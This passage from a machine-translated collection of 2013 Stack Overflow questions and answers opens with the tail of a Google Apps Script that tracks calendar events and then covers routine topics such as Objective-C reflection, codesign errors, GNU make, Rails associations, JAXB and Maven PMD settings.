    newsheet.setFrozenRows(1)
}
    ScriptProperties.setProperties({'lastTest': message}, true);    // even if no mail, write to script properties       
      }
  FUS1=new Date().toString().substr(25,6)+":00";
  var logmsg = 'Auto test launched on '+Utilities.formatDate(new Date(), FUS1,"MMM-dd-yy @ HH:mm");
  if (mailSent){logmsg+=" - mail sent"}else{logmsg+=" - no alert"}
   logsheet.getRange(last+1,1).setValue(logmsg);
}

function createMsg(logarray){
  var formertest = ScriptProperties.getProperty('lastTest');
  if(!formertest){return}
  var testitems = formertest.split('∏');
  var items = logarray.split('∏');
  if(items.length>testitems.length){
  var color='#CCFFCC'
  if(testitems.toString().indexOf(items[0])==-1){color='#FFBBBB'}
    var html = " Digest of Events created by someone else :<B> new events in RED </B><BR><BR><TABLE border = 1 cellpadding = 5><EVENTS></table>"    
  var table = "<tr valign='top' bgcolor='"+color+"' cellpadding=5>"
      color='#CCFFCC'
      for(zz=0;zz<items.length-1;++zz){
//  Logger.log(testitems.toString().indexOf(items[zz]))  
        var subitems = items[zz].split('|')
        if(testitems.toString().indexOf(items[zz+1])==-1){color='#FFBBBB'}
        for(tt=0;tt<subitems.length;++tt){
         table+= '<td>'+subitems[tt]+'</td>'
    }
        table+="</tr><tr valign='top' bgcolor='"+color+"' cellpadding=5>"   
        color='#CCFFCC'
            }
        table+='</tr>'
  var msghtml = html.replace("<EVENTS>",table) 
//    Logger.log(msghtml)
      return msghtml
}else{
  var color='#FFBBBB'
  if(items.toString().indexOf(testitems[0])==-1){color='#FFBBBB'}
  var html = "One (or more) event removed <B>in RED</B> as shown below<BR><BR><TABLE border = 1 cellpadding = 5 bgcolor='"+color+"'><EVENTS></table>"    
  var table = "<tr valign='top' bgcolor='"+color+"' cellpadding=5>"
      for(zz=0;zz<items.length;++zz){
//  Logger.log(testitems.toString().indexOf(items[zz]))  
        var subitems = testitems[zz].split('|')
        if(items.toString().indexOf(testitems[zz])==-1){
        for(tt=0;tt<subitems.length;++tt){
         table+= '<td>'+subitems[tt]+'</td>'
    }
        }
        table+="</tr>"
            }
        table+='</tr>'
  var msghtml = html.replace("<EVENTS>",table) 
//    Logger.log(msghtml)
      return msghtml
}
}

function checkCalendars(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet();
  var calendar_name = e.parameter.calendar;
  var startDate = new Date(e.parameter.start);
  var endDate = new Date(e.parameter.end);
  var calList = sh.getRange(1,1,sh.getLastRow(),2).getValues();
   for(nn=0;nn<calList.length;++nn){
     if(calList[nn][0]==calendar_name){var CalId = calList[nn][1];break}
   }
  var Calendar = CalendarApp.getCalendarById(CalId)
//   
  var sheetName = calendar_name + "-from-" + Utilities.formatDate(e.parameter.start, FUS1, "MMM-dd-yy")
      + "-to-" + Utilities.formatDate(e.parameter.end, FUS1, "MMM-dd-yy")  
//
  var events = Calendar.getEvents(startDate , endDate);
  if (events[0]) {
    logsheet.getRange(last+1,1).setValue('Manual test launched on '+Utilities.formatDate(new Date(), FUS1,"MMM-dd-yy"));
    ss.setActiveSheet(logsheet)
    var eventarray = new Array();
    var line = new Array();
    line.push('Calendar Name : '+calendar_name,'start ','end','Localisation','created by','Modification','event length','invited');
    eventarray.push(line);
    for (i = 0; i < events.length; i++) {
      if(events[i].getTitle().match('week')=='week'){continue}
      line = new Array();
      line.push(events[i].getTitle());
      FUS1=events[i].getStartTime().toString().substr(25,6)+":00";
      line.push(Utilities.formatDate(events[i].getStartTime(), FUS1, "MMM-dd-yy")+' @ ' +Utilities.formatDate(events[i].getStartTime(), FUS1, "HH:mm"));
      line.push(Utilities.formatDate(events[i].getEndTime(), FUS1, "MMM-dd-yy")+' @ ' +Utilities.formatDate(events[i].getEndTime(), FUS1, "HH:mm"));
      line.push(events[i].getLocation());      
      line.push(events[i].getCreators().join());
      line.push('on '+Utilities.formatDate(events[i].getLastUpdated(), FUS1, "MMM-dd-yy"))
      line.push((events[i].getEndTime() - events[i].getStartTime()) / 3600000);
      var invitelist='';
      var list = events[i].getGuestList()
          for(nn=0;nn<list.length;++nn){invitelist+=list[nn].getName()+', '}
      line.push(invitelist)
      eventarray.push(line);
    }
    Logger.log(eventarray)
      try{ 
    var newsheet = ss.insertSheet(sheetName,2);
      }catch(error){
    var newsheet = ss.insertSheet(sheetName+'-'+Utilities.formatDate(new Date(), FUS1, "HH-mm-ss"),2)
        }
    newsheet.getRange(1,1,eventarray.length,eventarray[0].length).setValues(eventarray);
    newsheet.getRange(1,1,1,eventarray[0].length).setBackgroundColor('#ffffcc');
    newsheet.setColumnWidth(1, 350).setColumnWidth(2, 150).setColumnWidth(3, 150).setColumnWidth(4, 150).setColumnWidth(5, 150).setColumnWidth(6, 105).setColumnWidth(7, 95).setColumnWidth(8, 450);
    newsheet.setFrozenRows(1)
    SpreadsheetApp.setActiveSheet(sheet.getSheets()[2]);// envoie sur la page créée
  } else {
    var startstring = Utilities.formatDate(e.parameter.start, FUS1, "dd-MMM-yyyy");
    var endstring = Utilities.formatDate(e.parameter.end, FUS1, "dd-MMM-yyyy");
    Browser.msgBox('no event between ' + startstring + ' and ' + endstring +' in your calendar :'+calendar_name);
  }
  var app = UiApp.getActiveApplication();
  app.close();
  return app;  
}

function checkCal() {
  var doc = SpreadsheetApp.getActiveSpreadsheet();
  var app = UiApp.createApplication().setTitle("Calendar Tracking");
  app.setHeight(265).setWidth(400);
  // Create a grid with 3 text boxes and corresponding labels
  var grid = app.createGrid(3, 2);
  grid.setWidget(0, 0, app.createLabel("Name of the Calendar:"));
  var list = app.createListBox();
  list.setName('calendar');
  grid.setWidget(0, 1, list);
  for (var i = 0; i < calList.length; i++) {
    list.addItem(calList[i][0]);
  }
  grid.setWidget(1, 0, app.createLabel('Start Date :'));
  grid.setWidget(1, 1, app.createDateBox().setId("start").setValue(new Date()));
  grid.setWidget(2, 0, app.createLabel('End Date :'));
  grid.setWidget(2, 1, app.createDateBox().setId("end").setValue(new Date(new Date().getTime()+30*86400000)));
  var panel = app.createVerticalPanel();
  panel.add(grid);
  var button = app.createButton('Start Checking & report');
  var handler = app.createServerClickHandler('checkCalendars');
  handler.addCallbackElement(grid);
  button.addClickHandler(handler);
  var clock = app.createImage('https://dl.dropbox.com/u/211279/Time-change-clock_animated_TR80.gif', 0, 0, 82, 82).setId('clock').setVisible(false);
  var clockHandler = app.createClientHandler().forTargets(clock).setVisible(true);
  button.addClickHandler(clockHandler)
  panel.add(button).add(clock);
  app.add(panel);
  doc.show(app);
}

function delsheets(){
  var sh = SpreadsheetApp.getActiveSheet();
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var numbofsheet=ss.getNumSheets();// check how many sheets in the spreadsheet
    for (pa=numbofsheet-1;pa>0;--pa){ 
      ss.setActiveSheet(ss.getSheets()[pa]);
      if(ss.getSheets()[pa].getSheetName()!='logger'&&ss.getSheets()[pa].getSheetName()!='master'){
      var newSheet = ss.deleteActiveSheet(); // delete sheets begining with the last one
      Utilities.sleep(400);
    }
    }
  ss.setActiveSheet(ss.getSheets()[1]);// return to first sheet as active sheet (useful in 'list' function)
  SpreadsheetApp.flush();
  }

// This small function is to get the list of calendar names & Ids that you have access to, please edit the master sheet to keep only the ones you want to monitor (without empty rows).
function Callist(){
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName('master')
  sh.getDataRange().clearContent();                      
  var list = new Array();
  var store = new Array();
  list = CalendarApp.getAllCalendars()
    for (n=0;n<list.length;++n){
      var name = list[n].getName() ;                     
      var id = list[n].getId() ;                     
        store.push( [name,id])
    }        
  sh.getRange(1,1,store.length,store[0].length).setValues(store);  
} 
```

# objective-c - 如何获取 Objective-C 类的 nil 属性的类名

> ID：15232164
> 
> 赞同：6
> 
> 时间：2013-03-05T19:11:47.593
> 
> 标签：objective-c, reflection

在 Objective-C 中，如果属性值`nil`使用`[obj.property class]`返回`nil`。有没有办法获取 Objective-C 类的 nil 属性的类名？

这是一个非常简单的例子：

```
#import <Foundation/Foundation.h>

@interface MyClass : NSObject

@property (nonatomic, assign) NSDictionary *dict;

@end

@implementation MyClass

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        MyClass *c = [[MyClass alloc] init];
        NSLog(@"class %@, %@", [c.dict class], [c.dict isKindOfClass:[NSDictionary class]] ? @"YES" : @"NO");
    }
} 
```

输出是`class (null), NO`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-05T19:17:55.277

检查 getter 的返回类型怎么样？

```
Method m = class_getInstanceMethod([MyClass class], @selector(somePropertyGetter));
char type[32];
method_getReturnType(m, type, sizeof(type));
printf("Property type: %s\n", type); 
```

**编辑：**要获取实际的类名，请检查属性本身（取自[该类别](https://github.com/AlanQuatermain/aqtoolkit/blob/master/Extensions/NSObject%2BProperties.m#L216)的代码）：

```
objc_property_t p = class_getProperty([MyClass class], "property");
// If you have a selector:
objc_property_t p = class_getProperty([MyClass class], sel_getName(someSelector));
const char *typeStr = property_getTypeString(p); 
```

# macos - 代码设计不工作“时间戳服务不可用”

> ID：15232165
> 
> 赞同：3
> 
> 时间：2013-03-05T19:11:49.820
> 
> 标签：macos

我是论坛的新手，所以请耐心等待。我对我们正在开发的应用程序有疑问，感谢任何建议或帮助。

我们有多个正在运行的构建机器，除了 1 之外，所有机器都在运行 10.8。另一个正在运行 10.7.4。

当我们在 10.7.4 系统上对应用程序进行代码设计时，我们没有任何问题。当我们尝试在 10.8 系统上进行协同设计时，我们收到错误“时间戳服务不可用”。奇怪的是，这只是在几周前才开始发生。我不认为这是防火墙问题，因为我旁边有两台机器，并且正在从我的位置运行代码设计（10.7.4 机器和 10.8 机器）。

我正在运行命令： codesign -s "Developer ID Applciation:" /path/to/app.

现在我知道有一个解决方法：--timestamp=none，但这不是我们想要使用的。我宁愿解决这个问题，而不仅仅是使用一种解决方法，大多数人承认这不是一个好的解决方法。

再次感谢任何帮助！D

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-13T00:08:27.653

我只是遇到了同样的问题，这是由于我的网络设置不正确引起的。具体来说，没有 dns 服务器设置，这意味着它无法访问网络时间服务器。

# gnu-make - 如何验证是否定义了宏并停止制作？

> ID：15232167
> 
> 赞同：1
> 
> 时间：2013-03-05T19:11:55.377
> 
> 标签：gnu-make

由于未定义的变量如果简单地替换为空文本（考虑目标目录）可能会导致意外行为，有没有办法让检查变量是否未定义并在这种情况下因错误而停止？

可以使用条件检测条件，但是如何停止执行？

```
ifeq ($(strip $(notdefinedforsure_man)),)
out = Undefined variable detected
endif 
```

我正在寻找像 requiredef var1, var2 这样的东西

或者在上面的条件中使用带有错误语句的简单返回

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T20:45:22.697

使用`origin`内置函数：

```
ifeq (undefined,$(origin VARIABLE))
  $(error VARIABLE is not defined)
endif 
```

有关详细信息，请参阅[文档](http://www.gnu.org/software/make/manual/html_node/Origin-Function.html)。

# ios - iOS 6 上的原生 Facebook 分享

> ID：15232170
> 
> 赞同：1
> 
> 时间：2013-03-05T19:11:58.690
> 
> 标签：ios, facebook, ios6

我想知道是否需要创建一个 facebook 应用程序来在 facebook 上分享。

我不希望用户实际登录或类似的东西。

正如我在[facebook 文档](https://developers.facebook.com/docs/howtos/share-native-dialogs-ios-sdk/)中看到的那样，它说先决条件是“确保您已经设置了 Facebook 登录”。我想知道这是否真的需要或者是我可以通过的东西，因为用户已经登录了他们的原生 Facebook 应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T07:16:26.390

我认为您正在谈论存储 facebook 的 ID 和密码。

你应该从设置中做到这一点......你也可以通过逻辑检查是否输入了facebook id和密码。如果没有，那么会话将进入登录页面，否则它只会分享特定的东西。

希望这可以帮助你...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-04T20:51:13.190

这就是我所说的：

```
#pragma mark - Share

- (void)sharingStatus {
    if ([SLComposeViewController isAvailableForServiceType:SLServiceTypeFacebook]) {
        NSLog(@"service available");
        self.shareButton.enabled = YES;
        self.shareButton.alpha = 1.0f;
    } else {
        self.shareButton.enabled = NO;
        self.shareButton.alpha = 0.5f;
    }
}

- (IBAction)facebookPost:(id)sender {

    if ([SLComposeViewController isAvailableForServiceType:SLServiceTypeFacebook]) {

        SLComposeViewController *mySLComposerSheet = [SLComposeViewController composeViewControllerForServiceType:SLServiceTypeFacebook];

        NSString *shareText = @"This is my share post!";
        [mySLComposerSheet setInitialText:shareText];

        [mySLComposerSheet addImage:[UIImage imageWithData:[NSData dataWithContentsOfURL:self.imageURL]]];

        [mySLComposerSheet addURL:[NSURL URLWithString:@"http://yourURL.com"]];

        [mySLComposerSheet setCompletionHandler:^(SLComposeViewControllerResult result) {

            switch (result) {
                case SLComposeViewControllerResultCancelled:
                    NSLog(@"Post Canceled");
                    break;
                case SLComposeViewControllerResultDone:
                    NSLog(@"Post Sucessful");
                    break;
                default:
                    break;
            }
        }];

        [self presentViewController:mySLComposerSheet animated:YES completion:nil];
    }
} 
```

# c - sscanf 是否具有破坏性？

> ID：15232181
> 
> 赞同：2
> 
> 时间：2013-03-05T19:12:32.283
> 
> 标签：c, getline, scanf

下面第一次调用 printf 打印出我的行。

第二次调用 printf 打印出空格。

这是怎么回事？

```
while (getline(&line, &size, config_file) != -1) {

    printf("line: %s\n", line);

    /* check to see if this line is a comment */
    char marker[1];
    sscanf(line, "%1s", marker);

    printf("line: %s\n", line); 

    if (marker[0] == '#') {
    .
    . 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:13:58.047

```
sscanf(line, "%1s", marker); 
```

除了您指定的一个字符外，它还`\0`在`marker`. 这显然是未定义的，但我的猜测是`\0`覆盖`line`.

换句话说`marker`，需要至少 2 个字符宽才能存储一个字符串。

# asp.net - 从 Web 根目录外部提供 ASPX 页面

> ID：15232186
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:12:54.577
> 
> 标签：asp.net

目前从事国际化项目。其中一项要求是获取从内容管理系统发布的静态文件，并根据区域设置提供正确的语言版本。不幸的是，发布的文件是 .aspx 并包含对母版页和可能的其他控件的引用。

如果页面位于 web 根目录中，这很容易。我只是在全局 Application_BeginRequest 中有一些东西，它接受 /abc.aspx 的请求并将其重写为 /content/[locale]/abc.aspx。

为了便于部署和其他几个原因，我真的希望这些文件位于 Web 根目录之外。例如，站点位于“D:\www_root\site\”中，内容位于“D:\content”中。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:15:32.217

您可以在 IIS 中创建一个[指向](http://www.iis.net/learn/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis#Virtual)`d:\content`.

> 虚拟目录是您在 IIS 中指定并映射到本地或远程服务器上的物理目录的目录名称（也称为路径）。然后目录名称成为应用程序 URL 的一部分，用户可以从浏览器请求 URL 以访问物理目录中的内容，例如网页或附加目录和文件的列表。

# asp.net - 一个网站在 IIS 中保持另一个网站存活的正确方法？

> ID：15232197
> 
> 赞同：2
> 
> 时间：2013-03-05T19:13:31.777
> 
> 标签：asp.net, iis, web

基本上我有一个网站，它将运行一个后台任务来执行一些“维护”职责，而它不是空闲的。当它空闲时，这些进程不需要运行。

现在我有一个辅助网站（主站点下的虚拟目录）也需要执行这些任务。但是，它们不能同时运行它们，否则会导致问题。

现在更正确的解决方案可能是合并站点，将任务分解到不同的应用程序中，或者更改任务以使它们在同时运行时不会相互冲突。出于某种原因，这些不是（当前）选项。

所以基本上当辅助网站处于活动状态时，确保主网站处于唤醒状态并运行这些任务的最佳方法是什么？

我认为最简单的解决方案是包含从辅助网站对主网站的引用，以便辅助网站上的任何页面加载都会强制第一个网站成为请求的服务器。类似于 1px 的图像。

但这会通过 IIS 更好地解决吗？他们应该共享同一个应用程序池吗？这两个应用程序都相对稳定，所以我不太担心一个网站会影响另一个网站。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:24:52.007

你的问题有点混乱。有一次你说两个站点不能同时运行任务，但是你说当辅助站点处于活动状态时，主站点也应该处于活动状态？

假设您的目标是一次只在一个地方运行任务，那么您基本上遇到了锁定问题。一些解决方案是：

*   维护一个锁（例如物理文件，数据库条目，...），并且只有在其他站点没有持有锁时才运行任务。
*   使任务在站点 A 中可调用，然后让站点 B 调用它，而不是运行任务本身。然后站点 A 可以跟踪它是否已经在运行该任务。
*   您自己列出的所有解决方案（尤其是将后台任务与网站完全分开）都是比上述更好的解决方案。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:25:20.150

有点难以依赖在 Web 服务上运行自动化任务。如果应用程序池被回收，那么该任务将丢失并且进程可能会失去其完整性。不能保证收集应用程序池时进程会很好地降级。

运行专用任务最好由设置为专用的系统处理。即，托管此 Web 服务的服务器。我认为您更适合让主机服务直接在本地服务器上运行，而不是作为 Web 服务暴露给 Web。

但是，如果这不是一个选项，那么您可能会从您所说的合并它们中受益。这样，只要子服务的应用程序池还活着，父服务就可用。同样，您可以让它们共享一个应用程序池。这里的问题如上所述，专用进程的完整性可能会受到损害。

.NET 并不是真正为运行专门的后台任务而设计的。这更适合支持 Web 服务的桌面应用程序。

# asp.net-mvc - 将调试器附加到 IIS 工作进程时出错

> ID：15232198
> 
> 赞同：1
> 
> 时间：2013-03-05T19:13:33.663
> 
> 标签：asp.net-mvc, azure, azure-web-roles

我有一个奇怪的问题，我的 MVC Azure 应用程序正在我的桌面上运行/调试，而不是在我的笔记本电脑上。在笔记本电脑上我得到一个错误

> 将调试器附加到 IIS 工作进程时出错

但是，在笔记本电脑上运行/调试更简单/更小的 MVC Azure 项目时，我没有遇到问题。笔记本电脑和台式机之间的唯一区别是笔记本电脑运行的是 Windows 8。该应用程序的早期版本确实在笔记本电脑上运行，但突然停止工作，我无法追溯原因。

有没有人对可能的原因有任何想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T23:15:58.943

能不能用TcpView( [http://technet.microsoft.com/en-us/sysinternals/bb897437.aspx](http://technet.microsoft.com/en-us/sysinternals/bb897437.aspx) )查看机器上是否与IIS Express使用的端口有端口冲突

# macos - 永久加载字体

> ID：15232200
> 
> 赞同：0
> 
> 时间：2013-03-05T19:13:45.760
> 
> 标签：macos, fonts, customization, core-text, custom-font

我正在构建一个需要使用自定义字体的 mac 应用程序。`CTFontManagerRegisterFontsForURL`字体是使用函数加载的。每次应用程序开始运行时都会加载字体。

无论如何只加载一次字体，然后简单地以编程方式使用它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:43:56.947

`kCTFontManagerScopeUser`将参数传递给`CTFontManagerRegisterFontsForURL`函数，将使字体在后续会话中可用。

# silverlight - 如何在 Windows Phone 的项目列表控件中显示和隐藏图像

> ID：15232201
> 
> 赞同：0
> 
> 时间：2013-03-05T19:13:52.300
> 
> 标签：silverlight, windows-phone-7

我有一个列表控件，每个项目包含两个图像和文本。在单击每个项目时，我想在所选列表项上隐藏或显示所选图像。

这是 XAML 代码片段：

```
 <ListBox x:Name="list" SelectionChanged="list_SelectionChanged"  >
            <ListBox.ItemTemplate>
                <DataTemplate>
                    <StackPanel>
                        <TextBlock Text="{Binding Name}"/>
                        <Image Source="{Binding ImagePath}" Stretch="None"/>
                        <Image Source="{Binding ImagePath}" Stretch="None"  
                               Visibility="{Binding ImageVisibility, 
                            Converter={StaticResource boolVisibilityConverter}}" />
                    </StackPanel>
                </DataTemplate>
            </ListBox.ItemTemplate>
        </ListBox> 
```

C#代码：

```
 dataSource = new ObservableCollection<ImageData>() 
        { 
        new ImageData(){Name = "User1:", ImagePath="/Images/user1.png", ImageVisibility = false},
        new ImageData(){Name = "User1:", ImagePath="/Images/user1.png", ImageVisibility = true},
        new ImageData(){Name = "User1:", ImagePath="/Images/user1.png", ImageVisibility = true},
        new ImageData(){Name = "User2:", ImagePath="/Images/user2.png", ImageVisibility = true}
        }; 
```

列表选择更改事件：

```
 private void list_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        ((ImageData)(((object[])(e.AddedItems))[0])).ImageVisibility = false;
        list.UpdateLayout();
    } 
```

图像数据类：

```
 public class ImageData
    {
        public string ImagePath { get; set; }
        public string Name { get; set; }
        public bool ImageVisibility { get; set; }
    } 
```

图像可见性转换器：

```
public class BooleanToVisibilityConverter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        bool flag = false;
        if (value is bool)
        {
            flag = (bool)value;
        }
        else if (value is bool?)
        {
            bool? nullable = (bool?)value;
            flag = nullable.HasValue ? nullable.Value : false;
        }
        return (flag ? Visibility.Visible : Visibility.Collapsed);
    }

    public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
    {
        return ((value is Visibility) && (((Visibility)value) == Visibility.Visible));
    }

} 
```

请帮我完成这样的功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T07:19:59.130

您需要使用 INotifyPropertyChanged 接口[http://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged.aspx](http://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged.aspx)

例如这样：

```
public class ImageData : INotifyPropertyChanged
{
    private bool _imageVisibility;
    public string ImagePath { get; set; }
    public string Name { get; set; }
    public bool ImageVisibility
    {
        get
        {
            return _imageVisibility;
        }
        set
        {
            _imageVisibility = value;
            OnPropertyChanged("ImageVisibility");
        }
    }
    public event PropertyChangedEventHandler PropertyChanged;

    [NotifyPropertyChangedInvocator]
    protected virtual void OnPropertyChanged(string propertyName)
    {
        var handler = PropertyChanged;
        if (handler != null) handler(this, new PropertyChangedEventArgs(propertyName));
    }
} 
```

您可以在此处查看根据您的任务进行的全部更改[（保管箱）](https://dl.dropbox.com/u/31216763/PhoneApp1.rar)

# exception - asp.net VB.net中的文件上传Null引用应用

> ID：15232202
> 
> 赞同：0
> 
> 时间：2013-03-05T19:13:54.633
> 
> 标签：exception, reference, null

嗨，我在我的应用程序中收到以下错误

System.NullReferenceException.Object 引用未设置到代码上的对象实例。我不明白为什么它会抛出这个特殊的异常。

```
 Dim namePosition As Int16
    Dim stream As IO.Stream

    stream = File1.PostedFile.InputStream
    Dim uploadedFile(stream.Length) As Byte

    stream.Read(uploadedFile, 0, stream.Length)

    namePosition = File1.PostedFile.FileName.LastIndexOf("\") + 1
    fileName = File1.PostedFile.FileName.Substring(namePosition)
    fileType = File1.PostedFile.ContentType 
```

# ruby-on-rails - Rails 中的表之间的一对一关系

> ID：15232206
> 
> 赞同：0
> 
> 时间：2013-03-05T19:14:01.317
> 
> 标签：ruby-on-rails, ruby

刚开始我在 ROR 的第一个项目，我在建立表之间的关系时遇到了问题。作为一个菜鸟，我在网上搜索了很多东西，尝试了很多东西，但不知道如何让它工作。这是我的问题：我为登录功能构建了一个用户表 - 用设计制作，现在我想构建另一个表 UserMeta 来携带我的用户的所有个人资料信息。

这是我所做的代码：

*应用程序/模型/user.rb*

```
class User < ActiveRecord::Base
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  attr_accessible :email, :password, :password_confirmation, :remember_me
  attr_accessible :email, :encrypted_password

  has_one :user_meta
end 
```

*app/models/user_meta.rb*

```
class UserMeta < ActiveRecord::Base
  attr_accessible :admin, :birthday, :company, :first_name, :job, :last_name, :phone, :rfid, :statut, :website, :user_id

  belongs_to :users
end

class User
  has_one :user_meta
end 
```

*app/controllers/user_controllers.rb*

```
 def new
    @user = User.new
    @meta = UserMeta.new

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @user }
    end
  end 
```

应用程序/视图/用户/new.html.erb

```
<%= form_for(@meta) do |f| %>
  <div class="field">
    <%= f.label :phone %><br />
    <%= f.text_field :phone %>
  </div>
  <div class="actions">
    <%= f.submit %>
  </div>
<% end %> 
```

它返回：

```
undefined method `meta_index_path' for #<#<Class:0x000001016f3f18>:0x00000100e9f6f0> 
```

我知道有一个或多个错误，最好的方法是什么？一些帮助将不胜感激:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:34:51.397

*   在 Rails 中，最好将类命名为与文件名相同。所以 app/models/user_meta.rb 应该是`class UserMeta < ActiveRecord::Base`.

*   无需重新打开 app/models/user_meta.rb 中的 User-class。他已经知道 app/models/user.rb 了。

*   改变你`belongs_to :users`的`belongs_to :user`

*   在 app/models/user.rb 你可以删除 2nd `attr_accessible :email`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:43:18.573

你可以改成这样：

**应用程序/模型/user.rb**

```
class User < ActiveRecord::Base
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  attr_accessible :email, :password, :password_confirmation, :remember_me, :encrypted_password

  has_one :user_meta
  accepts_nested_attributes_for :user_meta
end 
```

**应用程序/模型/user_meta.rb**

```
class UserMeta < ActiveRecord::Base
  attr_accessible :admin, :birthday, :company, :first_name, :job, :last_name, :phone, :rfid, :statut, :website, :user_id

  belongs_to :user
end 
```

**应用程序/控制器/user_controllers.rb**

```
def new
  @user = User.new
  @user.build_meta_user

   respond_to do |format|
     format.html
     format.json { render json: @user }
   end
end 
```

**应用程序/视图/用户/new.html.erb**

```
<%= form_for @user, :url => {:action => 'create'} do |f| %>
  <!-- User related fields -->
  <%= f.fields_for :user_meta do |meta_f| %>
    <div class="field">
      <%= meta_f.label :phone %><br />
      <%= meta_f.text_field :phone %>
    </div>
  <% end %>
  <div class="actions">
    <%= f.submit %>
  </div>
<% end %> 
```

# jaxb - JAX-RS 和 JAXB 实体在 xml 前导码之前导致带有空格的错误请求

> ID：15232208
> 
> 赞同：1
> 
> 时间：2013-03-05T19:14:11.363
> 
> 标签：jaxb, jersey, weblogic, jax-rs, moxy

我正在使用 RESTClient FireFox 扩展测试我的 JAX-RS 服务。有时我错误地在 xml 序言之前粘贴了一个空格。当我执行 PUT 时，这会导致 400 Bad Request。反正有没有让 Jersey/JAXB 忽略空白？

带有 Moxy 2.4.1 的 WebLogic 12c。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:20:15.080

[**如果 XML 声明之前有空格， EclipseLink MOXy**](http://www.eclipse.org/eclipselink/moxy.php)或任何其他[**JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222)实现使用的 XML 解析器将引发异常。如果您将 XML 作为 a 传递，`String`那么您可以先调用 trim 。

# c# - 为什么 GMail 不接受凭据？

> ID：15232209
> 
> 赞同：0
> 
> 时间：2013-03-05T19:14:14.297
> 
> 标签：c#, asp.net, login, httpwebrequest, credentials

我正在使用以下代码显示 gmail 登录页面

```
 WebRequest myRequest = WebRequest.Create("https://www.gmail.com");
    WebResponse myResponse = myRequest.GetResponse();
    Stream sr = myResponse.GetResponseStream();
    StreamReader sre = new StreamReader(sr);
    string s = sre.ReadToEnd();
    Response.Write(s);
    myResponse.Close(); 
```

但是当我填写用户名和密码并单击登录时，它不会让我登录并保持在同一页面上。

基本上我想在我的 ASP.NET 应用程序中存储我不同的登录详细信息（GMail、Yahoo、Facebook 等），当我单击 GMail 链接时，它应该填写用户名和密码，以便当我单击登录时它应该登录并显示收件箱。

# pmd - 跳过 Maven Flex PMD

> ID：15232211
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:14:23.000
> 
> 标签：pmd, flex-pmd

我们正在 flex-pmd-maven-plugin 中寻找一个选项，以使用命令行选项暂时跳过 pmd 执行。maven pmd 插件有一个 -Dpmd.skip=true 选项。

我也在为 flex-pmd-maven-plugin 寻找类似的东西。

```
 <plugin>
            <groupId>com.adobe.ac</groupId> 
            <artifactId>flex-pmd-maven-plugin</artifactId> 
            <version>${flex-pmd.version}</version> 
            <executions>
                <execution>
                    <phase>package</phase> 
                    <goals>
                        <goal>check</goal> 
                    </goals>
                </execution>
            </executions>
            <configuration>
                <ruleSet>build_rules/Flexpmd.xml</ruleSet> 
                <excludePackage>**/Mocked*.as</excludePackage>
            </configuration>
        </plugin> 
```

我查看了插件的源代码，似乎没有选择这样做。欢迎任何想法或解决此问题的方法..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T18:22:26.260

我找到了一种无需实际删除插件即可跳过 Flex PMD 的解决方法。flex-pmd 插件在***验证***maven 阶段运行。我将插件中的阶段参数化为并将命令行参数 -Dpmd.phase 作为部署或包传递。

然后我运行命令

```
mvn clean install -Dpmd.phase=deploy 
```

由于 maven 仅在安装阶段运行，并且 pmd 阶段更改为部署，因此跳过了 Flex PMD .. :)

当我想运行 Flex PMD 时，我只需将 hudson 构建更改为运行以下

```
mvn clean install -Dpmd.phase=package 
```

这里的代码片段

```
 <plugin>
            <groupId>com.adobe.ac</groupId> 
            <artifactId>flex-pmd-maven-plugin</artifactId> 
            <version>${flex-pmd.version}</version> 
            <executions>
                <execution>
                    <phase>${pmd.phase}</phase> 
                    <goals>
                        <goal>check</goal> 
                    </goals>
                </execution>
            </executions>
            <configuration>
                <ruleSet>build_rules/Flexpmd.xml</ruleSet> 
                <excludePackage>**/Mocked*.as</excludePackage>
            </configuration>
        </plugin> 
```

我在 pom 中还有以下默认属性，因此 pmd 将为运行正常 mvn clean install 的开发人员默认运行

```
<properties>
   <pmd.phase>package</pmd.phase>
</properties> 
```

# wpf - 为什么我的停靠面板的 LastChild 会溢出其容器？

> ID：15232215
> 
> 赞同：1
> 
> 时间：2013-03-05T19:14:34.107
> 
> 标签：wpf, listview, dockpanel

